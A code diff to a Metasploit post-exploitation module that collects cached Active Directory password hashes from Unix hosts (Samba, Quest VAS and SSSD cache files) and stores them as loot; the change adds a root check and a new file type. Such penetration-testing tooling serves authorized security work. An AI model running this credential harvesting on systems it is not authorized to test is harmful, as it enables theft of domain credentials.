@@ -29,6 +29,7 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
+  include Msf::Post::Common
 
   def initialize(info = {})
     super(
@@ -45,6 +46,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
+    fail_with(Msf::Module::Failure::NoAccess, 'Must be running as root') unless is_root?
     print_status('Finding files')
     files = [ '/var/lib/samba/private/secrets.tdb', '/var/lib/samba/passdb.tdb', '/var/opt/quest/vas/authcache/vas_auth.vdb' ]
     files += cmd_exec('ls /var/lib/sss/db/cache_*').split(/\r\n|\r|\n/)
@@ -64,7 +66,7 @@ class MetasploitModule < Msf::Post
       print_status("Downloading #{file}")
       data = read_file(file)
       file = file.split(sep).last
-      loot_file = store_loot('unix_cached_ad_hashes', 'text/plain', session, data, "unix_cached_ad_hashes_#{file}", 'Cached AD Hashes File')
+      loot_file = store_loot('unix_cached_ad_hashes', 'application/vnd.sqlite3', session, data, "unix_cached_ad_hashes_#{file}", 'Cached AD Hashes File')
       print_good("File stored in: #{loot_file}")
     end
   end
